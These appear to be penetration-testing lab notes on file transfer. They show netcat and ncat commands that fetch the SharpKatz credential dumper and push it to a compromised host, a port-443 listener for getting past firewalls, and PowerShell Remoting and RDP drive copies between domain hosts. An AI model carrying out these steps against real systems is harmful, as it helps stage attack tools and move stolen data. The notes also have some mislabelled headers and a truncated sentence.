This section will cover alternative methods such as transferring files using [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) and using RDP and PowerShell sessions.

## netcat EXFIL

In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](<https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)>)

`NetCat - Compromised Machine - Listening on Port 8000

```shell-session
 # Example using Original Netcat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

`Netcat-attacker`

```shell-session
$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## NETCAT download

`NEtCat - Attack Host - Sending File to Compromised machine`

```shell-session
$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
# Example using Ncat
$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

instead of listening, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

```shell-session
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## PS Remoting File Transfer (windows-environment)

out doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.
To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.
![](Pasted%20image%2020250311160348.png)
Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

`` Create a PowerShell Remoting Session to DATABASE01`

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

`Copy samplefile.txt from our Localhost to the DATABASE01 Session`

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

`Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

`Mounting a linux folder to rdp session disk`

```shell-session
$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

Alternatively, from Windows, the native [mstsc.ex](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

![500](https://academy.hackthebox.com/storage/modules/24/rdp.png)

After selecting the drive, we can interact with it in the remote session that follows.

**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
